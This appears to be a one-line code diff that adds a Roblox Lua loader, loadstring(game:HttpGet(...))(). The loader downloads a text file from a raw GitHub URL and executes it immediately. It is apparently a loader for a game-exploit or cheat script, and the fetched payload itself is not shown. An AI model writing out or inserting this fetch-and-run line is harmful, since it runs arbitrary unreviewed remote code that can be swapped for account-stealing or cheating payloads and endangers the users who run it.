@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PynovaGanz/Asu/refs/heads/main/zoooroff.txt"))()
